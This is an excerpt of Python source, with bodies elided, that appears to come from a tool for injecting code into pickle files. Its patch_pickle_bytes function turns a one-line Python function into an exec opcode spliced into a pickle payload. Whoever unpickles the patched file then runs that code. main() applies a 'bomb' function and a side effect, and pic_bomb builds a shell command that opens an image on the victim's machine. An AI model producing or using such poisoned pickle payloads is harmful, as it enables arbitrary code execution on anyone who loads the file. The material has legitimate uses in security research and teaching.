...
def pic_bomb():
    ...
    cmd = 'pic.jpg' if os.name == 'nt' else "if xdg-open pic.jpg 2> /dev/null ; then \n\techo '' \nelse \n\topen pic.jpg \nfi"
...
def patch_pickle_bytes(payload, f, optimize=False):
    # Patch pickle payload with execution of f
    if payload[-1:].decode() != '.':
        raise ValueError('unkonwn pickle format')
    source_line = make_source_from_function(f)
    if len(source_line.split('\n')) > 1:
        raise ValueError('source must be a oneliner')
    injection = _exec_code_op(source_line)
...
def main():
    ...
    payload = patch_pickle_bytes(payload, patch_bomb(patch_bomb, side_effect=hi_bomb), optimize=True)
